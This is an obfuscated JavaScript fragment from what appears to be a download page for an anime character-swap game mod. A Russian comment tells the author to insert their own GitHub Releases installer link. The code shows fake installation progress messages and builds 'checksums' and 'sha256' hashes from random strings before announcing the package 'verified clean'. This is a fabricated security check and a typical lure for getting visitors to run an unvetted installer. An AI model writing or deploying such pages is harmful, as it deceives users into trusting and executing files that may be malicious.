...
// === ЗАМЕНИ ЭТУ ССЫЛКУ НА ТВОЙ ФАЙЛ В GITHUB RELEASES ===
const YOUR_INSTALLER_URL = "https://github.com/Rayven2711/Anime_Character_Swapper-/releases/download/2.0/Anime_Swapper_Installer_v2.0.zip";
const DOWNLOAD_FILENAME = "Anime_Swapper_Installer_v2.0.zip";
...
function _0xe3f4() {
  const _0xf4a5 = [
    ...
    'Applying Maiko textures...',
    'Loading Asuna (SAO) model...',
    'Initializing Rem (Re:Zero) physics...',
    'Patching 2B (NieR) animations...',
    'Configuring custom physics engine...',
    'Preparing voice packs...',
    'Setting up installer interface...',
    'Optimizing 4K textures...'
  ];
  const _0xa5b6 = [
    `generating checksum: ${_0xf2a3()}${_0xf2a3()}`,
    `binary hash: sha256:${_0xf2a3(32)}${_0xf2a3(32)}`,
    `✓ Package verified clean - hash ${_0xf2a3()}${_0xf2a3()}`
  ];
...
function _0xc9d0a() {
  ...
  setTimeout(() => {
    _0xb4c5('preparing', 'Preparing character installer...');
  }, 2000);
  setTimeout(() => {
    _0xb4c5('preparing', 'Loading character models...');
  }, 4000);
  setTimeout(() => {
